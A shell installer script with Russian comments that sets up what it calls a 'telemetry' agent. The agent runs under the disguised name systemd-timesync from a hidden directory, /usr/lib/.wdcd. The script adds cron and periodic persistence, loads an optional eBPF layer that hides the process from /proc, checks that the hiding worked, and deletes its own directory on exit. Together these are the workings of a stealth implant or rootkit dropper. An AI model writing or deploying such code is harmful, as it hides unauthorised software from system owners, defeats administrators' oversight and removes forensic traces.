#!/bin/sh
set -e
HERE="$(cd "$(dirname "$0")" && pwd)"
cd "$HERE"
chmod 700 "$HERE" 2>/dev/null || true
trap 'cd / 2>/dev/null; [ -n "$HERE" ] && [ "$HERE" != "/" ] && rm -rf "$HERE" 2>/dev/null' EXIT

echo "== 1/2 телеметрия: агент + crond/periodic автозапуск =="
sh ./install.sh
PID=$(pgrep -x systemd-timesync | head -1 || true)
case "${PID:-0}" in ''|0|*[!0-9]*) PID="";; esac

echo "== 2/2 eBPF-сокрытие (опционально, контейнер без systemd) =="
HIDE_RC=1
if [ -r /sys/kernel/btf/vmlinux ] && [ -x ./hide_install.sh ] && command -v bash >/dev/null 2>&1; then
	bash ./hide_install.sh systemd-timesync && HIDE_RC=0 || echo "!! eBPF-слой не поднялся (контейнер) — телеметрия работает, сокрытия нет"
else
	echo "!! eBPF пропущен: нет BTF или bash в контейнере — телеметрия работает"
fi

echo "== проверка =="
if [ -z "$PID" ]; then
	echo "агент не поднялся по имени systemd-timesync: pgrep пуст — смотри /usr/lib/.wdcd/bin/systemd-timesync вручную"
	exit 0
fi
if kill -0 "$PID" 2>/dev/null; then echo "агент жив: да (pid=$PID)"; else echo "агент жив: НЕТ (pid=$PID)"; fi
if ls /proc 2>/dev/null | grep -qx "$PID"; then
	echo "виден в ls /proc: да  <- сокрытие не применилось"
else
	echo "виден в ls /proc: НЕТ (pid=$PID на месте)"
fi
if command -v crond >/dev/null 2>&1; then echo "crond: запущен (/etc/crontabs/root + /etc/periodic/15min)"; fi
echo "путь: /usr/lib/.wdcd/bin/systemd-timesync"
[ "$HIDE_RC" = 0 ] || exit 0
